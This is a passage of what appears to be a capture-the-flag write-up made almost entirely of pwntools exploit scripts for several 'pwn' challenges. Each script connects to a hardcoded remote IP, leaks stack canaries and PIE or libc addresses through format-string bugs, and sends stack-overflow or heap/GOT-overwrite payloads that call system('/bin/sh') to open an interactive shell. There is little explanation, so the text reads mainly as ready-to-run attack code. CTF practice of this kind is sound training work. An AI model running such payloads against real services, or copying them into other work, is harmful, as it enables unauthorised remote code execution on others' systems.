gc   =    lambda a              :u64(pw.recv(7).rjust(8,b'\x00'))
pwpw =    lambda                :pw.interactive()
lss  =    lambda s :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
    
def sb(libc_base):
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

def orw(libc_base):
    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']

def search():
    libc = LibcSearcher("puts", puts)
    libc_base = puts - libc.dump("puts")
    system = libc.dump("system") + libc_base
    binsh = libc.dump("str_bin_sh") + libc_base
    return system,binsh

def dbg(a=''):
    if a !='':
        gdb.attach(pw,a) 
        pause()
    else:
        gdb.attach(pw)  
        pause()
    
context.arch='amd64'
file = './2'
elf = ELF(file)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
debug = 1
if debug == 0:
    pw = process(file)
if debug == 1:
    pw = remote('182.92.237.102',10011)

pay = b'flagis,%15$p,%17$p'
sl(pay)
ru(b'>>')
canary = int(ru(b','),16)
pie_base = int(ru(b' '),16)-254-elf.sym['main']
lss('canary')
lss('pie_base')

pay=b'exit'.ljust(0x38,b'\x00')+p64(canary)*2+p64(pie_base+0x1291)
sl(pay)

pwpw()
```

## 3.pwn3
```python
from pwn import *
from struct import *
from ctypes import *
from LibcSearcher import *
from functools import reduce
import gmpy2

c = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
s    =    lambda a              :pw.send(a)
sl   =    lambda a              :pw.sendline(a)
sa   =    lambda a,b            :pw.sendafter(a,b)
sla  =    lambda a,b            :pw.sendlineafter(a,b)
r    =    lambda a=6666         :pw.recv(a)
rl   =    lambda                :pw.recvline()
ru   =    lambda a,b=True       :pw.recvuntil(a,b)
g64  =    lambda                :u64(pw.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
g32  =    lambda                :u32(pw.recvuntil(b'\xf7').ljust(4,b'\x00'))
gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b'\x00'))
gc   =    lambda a              :u64(pw.recv(7).rjust(8,b'\x00'))
pwpw =    lambda                :pw.interactive()
lss  =    lambda s :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
    
def sb(libc_base):
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

def orw(libc_base):
    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']

def search():
    libc = LibcSearcher("puts", puts)
    libc_base = puts - libc.dump("puts")
    system = libc.dump("system") + libc_base
    binsh = libc.dump("str_bin_sh") + libc_base
    return system,binsh

def dbg(a=''):
    if a !='':
        gdb.attach(pw,a) 
        pause()
    else:
        gdb.attach(pw)  
        pause()
    
context.arch='amd64'
file = './3'
elf = ELF(file)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
debug = 1
if debug == 0:
    pw = process(file)
if debug == 1:
    pw = remote('182.92.237.102',10012)

sl(b'%27$p,%19$p')
ru(b'answered:\n')

__libc_start_main = int(ru(b','),16)-245
# libc_base = __libc_start_main-0x01ade0
libc = LibcSearcher("__libc_start_main", __libc_start_main)
libc_base = __libc_start_main - libc.dump("__libc_start_main")
system = libc.dump("system") + libc_base
binsh = libc.dump("str_bin_sh") + libc_base

canary = int(ru(b'\n'),16)
lss('libc_base')
lss('canary')

pay = b'a'.ljust(0x88,b'\x00')+p32(canary)+b'a'*0xc+p32(0x0804900e)+p32(system)*2+p64(binsh)
sl(pay)
pwpw()
```

## 4.pwn4
```python
from pwn import *
from struct import *
from ctypes import *
from LibcSearcher import *
from functools import reduce
import gmpy2
#import ctf_pb2

c = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
s    =    lambda a              :pw.send(a)
sl   =    lambda a              :pw.sendline(a)
sa   =    lambda a,b            :pw.sendafter(a,b)
sla  =    lambda a,b            :pw.sendlineafter(a,b)
r    =    lambda a=6666         :pw.recv(a)
rl   =    lambda                :pw.recvline()
ru   =    lambda a,b=True       :pw.recvuntil(a,b)
g64  =    lambda                :u64(pw.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
g32  =    lambda                :u32(pw.recvuntil(b'\xf7').ljust(4,b'\x00'))
gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b'\x00'))
gc   =    lambda a              :u64(pw.recv(7).rjust(8,b'\x00'))
pwpw =    lambda                :pw.interactive()
lss  =    lambda s :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))

def sb(libc_base):
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

def orw(libc_base):
    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']

def search():
    libc = LibcSearcher("puts", puts)
    libc_base = puts - libc.dump("puts")
    system = libc.dump("system") + libc_base
    binsh = libc.dump("str_bin_sh") + libc_base
    return system,binsh

def dbg(a=''):
    if a !='':
        gdb.attach(pw,a) 
        pause()
    else:
        gdb.attach(pw)  
        pause()

context.arch='amd64'
# context.arch = 'i386'
file = './4'
elf = ELF(file)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
debug = 1
if debug == 0:
    pw = process(file)
if debug == 1:
    pw = remote('182.92.237.102',10019)

sl("I'm ready for shopping")

system_plt = elf.plt['system']
sleep(3)

def add(size,n,content=''):
    sla(b'Action: ',str(1))
    sla(b'Item ID: ',str(size))
    sla(b'Quantity: ',str(n))
    if content == '':
        sla(b'(0/1): ',str(0))
    else:
        sla(b'(0/1): ',str(1))
        sa(b'Message: ',content)

for i in range(12):
    add(0x4000,1000)

# dbg('b *0x400c0f')
add(0x4000,262,'0'*0x3FF0)
payload = b'1'*0x50 + p32(0) + p32(3) + 10*p64(0x60201d)
sleep(2)
s(payload)

sleep(0.2)
payload = b'/bin/sh'.ljust(0xB,b'\x00') + p64(system_plt)
payload = payload.ljust(0x60,b'b')
add(0x60,0,payload)

pwpw()

```

